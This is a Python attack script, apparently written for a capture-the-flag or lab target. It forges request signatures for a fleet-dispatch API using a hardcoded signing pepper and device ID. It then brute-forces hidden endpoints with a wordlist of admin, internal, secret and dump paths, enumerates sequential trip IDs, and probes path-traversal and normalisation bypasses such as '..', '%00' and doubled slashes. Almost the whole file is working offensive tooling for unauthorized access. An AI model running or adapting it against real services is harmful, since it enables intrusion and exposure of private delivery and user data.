import sys, time, hmac, hashlib, urllib.request, urllib.error
sys.stdout.reconfigure(encoding="utf-8", errors="replace")

BASE = "https://web-198ec1caaeb6fd82.web.h7tex.com"
PEPPER = "fleetlink_signing_pepper_v3"
DEV = "flt-22222222-2222-3333-4444-555555555555"


def go(path, q=""):
    ts = str(int(time.time()))
    k = hashlib.sha256((PEPPER + ":" + DEV).encode()).digest()
    sig = hmac.new(k, "\n".join(["GET", path, q, ts]).encode(), hashlib.sha256).hexdigest()
    r = urllib.request.Request(BASE + path + (("?" + q) if q else ""), method="GET",
                               headers={"X-Device-Id": DEV, "X-Ts": ts, "X-Sig": sig})
    try:
        with urllib.request.urlopen(r, timeout=25) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return "ERR", str(e)[:80]


WORDS = """trips trip manifest fleet dispatch dispatcher driver drivers pod delivery deliveries signed sign
seal sealed delivered proof custody handoff sheet loads run stops waybill orders shipments cargo parcels
depot yard vehicle devices device sessions session auth token users user admin internal private hidden secret
config status health report export dump all full summary flag manifest.json fleet.json trips.json
docs openapi swagger healthz version info ping panel""".split()

PREFIX = ["/api/v1/", "/api/v2/", "/api/", "/v1/", "/internal/", "/dispatch/", "/"]

paths = [p + w for p in PREFIX for w in WORDS]
print("candidates:", len(paths))
seen = {}
for i, p in enumerate(paths):
    s, b = go(p, "")
    key = (s, "html404" if b.startswith("<!doctype") else "other")
    if key[1] == "other":
        print(f"HIT {p:44s} {s} {b[:150].strip()}")
    seen[key] = seen.get(key, 0) + 1
    if i % 100 == 0:
        print(f"  ...{i}/{len(paths)}", flush=True)
print(seen)
print("== positional ids and two-segment paths")
extra = ["/api/v1/trips/T-88%02d" % i for i in range(795, 840)] + [
    "/api/v1/fleet/manifest", "/api/v1/dispatch/manifest", "/api/v1/trips/manifest", "/api/v1/trips/fleet",
    "/api/v1/trips/all", "/api/v1/trips/1", "/api/v1/manifest/fleet", "/api/v1/devices", "/api/v1/driver/T-8801",
    "/api/v1/trips/T-8801/sign", "/api/v1/trips/T-8801/deliver", "/api/v1/sign/T-8801", "/api/v1/trips/sign",
    "/api/v1/fleet/T-8801", "/api/v1/trips/dispatcher", "/api/v1/v1/trips", "//api/v1/trips", "/api/v1/trips//",
    "/api/v1//trips", "/api//v1/trips", "/API/V1/TRIPS", "/api/v1/Trips", "/api/v1/trips.", "/api/v1/trips%2f..",
    "/api/v1/trips/..", "/api/v1/trips/../fleet", "/api/v1/trips%00", "/api/v1/trips;", "/api/v1/trips.json",
    "/api/v1/manifest/", "/api/v1/fleet/", "/api/v1/trips/index", "/api/v1/trips/list", "/api/v1/trips/export",
]
for p in extra:
    s, b = go(p, "")
    if not b.startswith("<!doctype"):
        print(f"HIT {p:40s} {s} {b[:150].strip()}")
print("extra done")
